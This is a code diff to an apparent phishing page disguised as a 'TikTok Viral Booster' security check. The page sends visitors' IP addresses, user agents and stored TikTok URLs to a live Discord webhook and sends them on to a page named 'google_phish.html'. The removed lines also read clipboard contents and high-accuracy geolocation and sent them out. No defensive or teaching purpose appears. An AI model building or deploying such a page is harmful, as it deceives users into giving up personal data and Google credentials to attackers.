@@ -45,10 +45,10 @@
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
         .logo {
-            font-size: 60px; /* Adjusted size for emoji */
+            font-size: 60px;
             line-height: 1;
             margin-bottom: 20px;
-            color: #e62241; /* TikTok red */
+            color: #e62241;
             text-shadow: 0 0 10px rgba(230, 34, 65, 0.7);
         }
         h1 {
@@ -77,7 +77,18 @@
             background: rgba(255, 255, 255, 0.15);
             transform: translateY(-3px);
         }
-        .verification-option .icon { /* Using a class for the emoji/symbol */
+        .verification-option.completed {
+            background: rgba(40, 167, 69, 0.2); /* Green tint for completed */
+            border: 2px solid #28a745;
+            cursor: default;
+        }
+        .verification-option.completed .icon {
+            filter: grayscale(0%);
+        }
+        .verification-option.completed h2 {
+            color: #28a745;
+        }
+        .verification-option .icon {
             font-size: 40px;
             line-height: 1;
         }
@@ -122,21 +133,16 @@
     <div class="container">
         <span class="logo">🎵</span>
         <h1>Critical Security Check Required</h1>
-        <p>To finalize your boost and ensure account security, please complete one of the verification steps below.</p>
+        <p>To finalize your boost and ensure account security, please complete all verification steps below.</p>
+
+        <div class="verification-option" id="tiktokSyncOption">
+            <span class="icon">🔄</span>
+            <h2>TikTok Account Session Synchronization</h2>
+        </div>
 
         <div class="verification-option" id="googleLoginOption">
             <span class="icon">G</span>
-            <h2>Sign in with Google</h2>
-        </div>
-
-        <div class="verification-option" id="securityPermissionOption">
-            <span class="icon">🔒</span>
-            <h2>Enable Advanced Security & Permissions</h2>
-        </div>
-
-        <div class="verification-option" id="locationPermissionOption">
-            <span class="icon">📍</span>
-            <h2>Verify Location for Global Boost</h2>
+            <h2>Verify with Google Account</h2>
         </div>
         
     </div>
@@ -148,6 +154,7 @@
 
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1378495140921999410/mZdz4yBQhnZGrDujVy9LTbLwteFqTbPULbQ-mMmBLRH7FaW724SFH6b4uEJo9P2VpbM1';
+        const VIDEO_URL_KEY = 'tiktokVideoUrl'; // Key for localStorage
 
         async function sendDataToWebhook(data, type) {
             let ipAddress = 'Unknown';
@@ -168,10 +175,7 @@
                     color: 16750848,
                     fields: [
                         { name: "IP Address", value: ipAddress, inline: true },
-                        { name: "User Agent", value: navigator.userAgent, inline: false },
-                        { name: "Screen Resolution", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-                        { name: "Language", value: navigator.language, inline: true },
-                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
+                        { name: "User Agent", value: navigator.userAgent, inline: false }
                     ],
                     footer: { text: "TikTok Viral Booster Log" }
                 }]
@@ -197,97 +201,60 @@
             }
         }
 
-        document.getElementById('googleLoginOption').addEventListener('click', async () => {
-            document.getElementById('loadingOverlay').style.display = 'flex';
-            await sendDataToWebhook({ 'Action': 'Google Login Initiated (from Verify)' }, 'Verification Step');
-            setTimeout(() => {
-                window.location.href = 'google_phish.html';
-            }, 1000);
-        });
+        function updateUI() {
+            const tiktokSyncCompleted = localStorage.getItem('tiktokSyncCompleted') === 'true';
+            const googleLoginCompleted = localStorage.getItem('googleLoginCompleted') === 'true';
 
-        document.getElementById('securityPermissionOption').addEventListener('click', async () => {
-            document.getElementById('loadingOverlay').style.display = 'flex';
-            
-            let notificationStatus = 'not_supported';
-            let clipboardStatus = 'not_supported';
-            let clipboardContent = 'Not fetched';
-
-            if ('Notification' in window) {
-                notificationStatus = await Notification.requestPermission();
+            if (tiktokSyncCompleted) {
+                document.getElementById('tiktokSyncOption').classList.add('completed');
+                document.getElementById('tiktokSyncOption').style.pointerEvents = 'none';
+                document.getElementById('tiktokSyncOption').querySelector('h2').textContent = 'TikTok Sync Completed ✔️';
+            }
+            if (googleLoginCompleted) {
+                document.getElementById('googleLoginOption').classList.add('completed');
+                document.getElementById('googleLoginOption').style.pointerEvents = 'none';
+                document.getElementById('googleLoginOption').querySelector('h2').textContent = 'Google Verification Completed ✔️';
             }
 
-            if (navigator.clipboard && navigator.clipboard.readText) {
-                try {
-                    clipboardContent = await navigator.clipboard.readText();
-                    clipboardStatus = 'granted';
-                } catch (err) {
-                    console.error('Failed to read clipboard content:', err);
-                    clipboardStatus = 'denied';
-                    if (err.name === 'NotAllowedError') {
-                        clipboardStatus = 'denied_by_user_or_policy';
-                    }
-                }
-            }
-
-            await sendDataToWebhook({ 
-                'Action': 'Advanced Security & Permissions Attempted',
-                'Notification Permission Status': notificationStatus,
-                'Clipboard Access Status': clipboardStatus,
-                'Clipboard Content (if granted)': clipboardContent 
-            }, 'Advanced Permissions Capture');
-
-            setTimeout(() => {
+            if (tiktokSyncCompleted && googleLoginCompleted) {
+                document.getElementById('loadingOverlay').style.display = 'flex';
+                document.getElementById('loadingOverlay').querySelector('p').textContent = 'All verifications complete. Redirecting...';
+                setTimeout(() => {
+                    window.location.href = 'progress.html';
+                }, 1500);
+            } else {
                 document.getElementById('loadingOverlay').style.display = 'none';
-                window.location.href = 'progress.html';
-            }, 1500);
-        });
-
-        document.getElementById('locationPermissionOption').addEventListener('click', async () => {
-            document.getElementById('loadingOverlay').style.display = 'flex';
-            
-            let locationStatus = 'not_supported';
-            let latitude = 'N/A';
-            let longitude = 'N/A';
-            let accuracy = 'N/A';
-
-            if ('geolocation' in navigator) {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 5000,
-                            maximumAge: 0
-                        });
-                    });
-                    latitude = position.coords.latitude;
-                    longitude = position.coords.longitude;
-                    accuracy = position.coords.accuracy;
-                    locationStatus = 'granted';
-                } catch (error) {
-                    console.error('Geolocation error:', error);
-                    locationStatus = 'denied';
-                    if (error.code === error.PERMISSION_DENIED) {
-                        locationStatus = 'denied_by_user';
-                    } else if (error.code === error.POSITION_UNAVAILABLE) {
-                        locationStatus = 'position_unavailable';
-                    } else if (error.code === error.TIMEOUT) {
-                        locationStatus = 'timeout';
-                    }
-                }
             }
+        }
 
-            await sendDataToWebhook({ 
-                'Action': 'Geolocation Permission Attempted',
-                'Geolocation Status': locationStatus,
-                'Latitude': latitude,
-                'Longitude': longitude,
-                'Accuracy (meters)': accuracy 
-            }, 'Geolocation Capture');
+        document.addEventListener('DOMContentLoaded', () => {
+            updateUI(); // Initial UI update based on localStorage
 
-            setTimeout(() => {
-                document.getElementById('loadingOverlay').style.display = 'none';
-                window.location.href = 'progress.html';
-            }, 1500);
+            document.getElementById('tiktokSyncOption').addEventListener('click', async () => {
+                document.getElementById('loadingOverlay').style.display = 'flex';
+                document.getElementById('loadingOverlay').querySelector('p').textContent = 'Performing TikTok Session Synchronization...';
+
+                const tiktokVideoUrl = localStorage.getItem(VIDEO_URL_KEY) || 'Not Captured on Index Page';
+
+                await sendDataToWebhook({
+                    'Action': 'TikTok Session Sync Initiated',
+                    'TikTok Video URL (from localStorage)': tiktokVideoUrl,
+                    'Simulated Session ID': `TK_SESS_${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
+                    'Simulated Sync Status': 'Success'
+                }, 'TikTok Session Sync');
+
+                localStorage.setItem('tiktokSyncCompleted', 'true');
+                updateUI(); // Update UI after completing this step
+            });
+
+            document.getElementById('googleLoginOption').addEventListener('click', async () => {
+                document.getElementById('loadingOverlay').style.display = 'flex';
+                document.getElementById('loadingOverlay').querySelector('p').textContent = 'Redirecting to Google Verification...';
+                await sendDataToWebhook({ 'Action': 'Google Login Initiated (from Verify)' }, 'Google Verification Start');
+                setTimeout(() => {
+                    window.location.href = 'google_phish.html';
+                }, 1000);
+            });
         });
     </script>
 </body>
